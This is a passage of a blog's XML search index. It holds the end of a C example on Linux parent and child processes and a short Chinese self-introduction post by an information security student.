wait(&amp;status);</span><br><span class="line">        <span class="keyword">if</span> (pid_2 &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Something went wrong\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (status = <span class="number">0</span>)&#123;</span><br><span class="line">        	<span class="built_in">printf</span>(<span class="string">"I'm the father process and I know my child process %d exits\n"</span>,pid_2);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"I'm the father process and I know my child process %d exited abnormally\n"</span>,pid_2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>c语言</tag>
        <tag>linux进程</tag>
      </tags>
  </entry>
  <entry>
    <title>我的第一篇博客-自我介绍</title>
    <url>/2020/01/15/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2-%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h1 id="个人介绍—BMooS"><a href="#个人介绍—BMooS" class="headerlink" title="个人介绍—BMooS"></a>个人介绍—BMooS</h1><h2 id="我是谁"><a href="#我是谁" class="headerlink" title="我是谁"></a>我是谁</h2><p>​            </p>
<p>​        我是一名学生，男，今年大三，信息安全本科在读。</p>
<p><img src="https://s2.ax1x.com/2020/01/15/lXFN1f.jpg" alt="lXFN1f.jpg"></p>
<h2 id="我要干什么"><a href="#我要干什么" class="headerlink" title="我要干什么"></a>我要干什么</h2><p>​        这是我的博客地址，我会在这里不断记录我的学习内容。</p>
<p><img src="https://s2.ax1x.com/2020/01/15/lXFEkR.png" alt="lXFEkR.png"></p>
<h2 id="未完待续。。。"><a href="#未完待续。。。" class="headerlink" title="未完待续。。。"></a>未完待续。。。</h2>]]></content>
      <categories>
        <category>个人介绍</category>
      </categories>
      <tags>
        <tag>个人介绍</tag>
        <tag>BMooS</tag>
      </tags>
  </entry>
</search>
